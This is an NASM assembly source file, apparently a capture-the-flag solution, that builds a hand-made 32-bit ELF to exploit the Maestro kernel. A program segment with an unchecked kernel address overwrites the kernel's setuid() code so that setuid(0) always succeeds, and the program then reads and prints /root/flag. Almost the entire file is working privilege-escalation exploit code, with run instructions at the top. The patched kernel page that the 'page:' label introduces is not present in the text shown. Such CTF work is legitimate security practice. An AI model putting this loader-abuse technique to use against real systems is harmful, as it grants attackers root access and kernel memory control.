
; Asm:  nasm -f bin -o exp solve.s
; Run:  mknod nod b 8 0; dd if=nod of=exp; chmod +x exp; ./exp

BITS 32

ehdr:                                                 ; Elf32_Ehdr
              db      0x7F, "ELF", 1, 1, 1, 0         ;   e_ident
      times 8 db      0
              dw      2                               ;   e_type
              dw      3                               ;   e_machine
              dd      1                               ;   e_version
              dd      _start                          ;   e_entry
              dd      phdr - $$                       ;   e_phoff
              dd      shdr - $$                       ;   e_shoff
              dd      0                               ;   e_flags
              dw      ehdrsize                        ;   e_ehsize
              dw      phdrsize                        ;   e_phentsize
              dw      2                               ;   e_phnum
              dw      shentsize                       ;   e_shentsize
              dw      1                               ;   e_shnum
              dw      0                               ;   e_shstrndx

ehdrsize      equ     $ - ehdr

phdr:
main_seg:                                             ; Elf32_Phdr
              dd      1                               ;   p_type
              dd      0                               ;   p_offset
              dd      $$                              ;   p_vaddr
              dd      0                               ;   p_paddr
              dd      mainsize                        ;   p_filesz
              dd      mainsize                        ;   p_memsz
              dd      5                               ;   p_flags
              dd      0x1000                          ;   p_align

phdrsize      equ     $ - phdr

; Maestro ELF loader doesn't check if the segment mappings are in the user-space range.
; We can abuse this fact to overwrite kernel memory.
pwn_seg:
              dd      1                               ;   p_type
              dd      page - $$                       ;   p_offset
              dd      0xc025e000                      ;   p_vaddr     <-- kernel page addr
              dd      0                               ;   p_paddr
              dd      0x1000                          ;   p_filesz
              dd      0x1000                          ;   p_memsz
              dd      7                               ;   p_flags
              dd      0x1000                          ;   p_align

; Maestro doesn't like ELFs with no sections, so we have to add one
shdr:
              dd    1                                 ; sh_name
              dd    6                                 ; sh_type = SHT_DYNAMIC
              dd    0                                 ; sh_flags
              dd    0                                 ; sh_addr
              dd    0                                 ; sh_offset
              dd    0                                 ; sh_size
              dd    0                                 ; sh_link
              dd    0                                 ; sh_info
              dd    8                                 ; sh_addralign
              dd    7                                 ; sh_entsize

shentsize     equ   $ - shdr


_start:
    ; setuid(0)
    xor ebx, ebx
    mov eax, 23
    int 0x80
    
    ; open("/root/flag", 0)
    mov ebx, flag
    mov eax, 5
    mov ecx, 0
    int 80h

    ; read(eax, esp, 0x100)
    mov eax, 3  
    mov ebx, eax
    mov ecx, esp 
    mov edx, 0x100    
    int 80h     
    
    ; write(1, esp, len)
    mov edx, eax
    mov eax, 4
    mov ebx, 1
    mov ecx, esp 
    int 80h 

    ; exit(0)
    mov eax, 1
    xor ebx, ebx
    int 80h


flag db "/root/flag", 0
mainsize equ $ - $$

; Copy of a kernel page @ 0xc025e000, which contains the setuid() function code, except
; it had been patched to allow setuid(0) unconditionally

page:
    